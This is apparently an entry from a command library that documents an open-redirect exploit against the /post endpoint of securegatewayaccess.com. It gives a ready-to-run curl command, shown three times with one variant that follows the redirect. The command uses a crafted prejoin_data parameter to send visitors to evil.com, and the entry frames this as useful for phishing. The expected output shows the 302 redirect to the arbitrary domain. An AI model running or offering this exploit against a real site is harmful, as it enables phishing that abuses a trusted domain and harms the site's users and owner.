---
data: >-
  curl -i
  "https://securegatewayaccess.com/post?prejoin_data=domain%2Fevil.com/?=&weg_digest=eacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
tags:
  - web
  - redirect
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:27.170Z'
id: 711f9619-c930-4c8c-b86d-f603406e75f0
verified: false
validated: true
submitted: true
---
# curl-get-securegateway-post-redirect

## Command

```bash
curl -i "https://securegatewayaccess.com/post?prejoin_data=domain%2Fevil.com/?=&weg_digest=eacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
```

## Description

This command sends a GET request to the vulnerable /post endpoint on securegatewayaccess.com with manipulated prejoin_data to trigger an open redirect, useful for testing phishing vectors by inspecting the Location header.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include response headers in output | Yes |
| `URL` | Target endpoint with prejoin_data=domain%2Fevil.com/?= and weg_digest | Yes |

## Examples

### Basic Usage

```bash
curl -i "https://securegatewayaccess.com/post?prejoin_data=domain%2Fevil.com/?=&weg_digest=eacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
```

### Advanced Usage (Follow Redirect)

```bash
curl -i -L "https://securegatewayaccess.com/post?prejoin_data=domain%2Fevil.com/?=&weg_digest=eacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
```

## Expected Output

HTTP/1.1 302 Found
Location: http://evil.com/?=/tipping/purchase_tokens/

Indicates successful redirect to arbitrary domain.

## Related

- [[Related Procedure: Exploit-Open-Redirect-on-securegatewayaccess-com-post]]
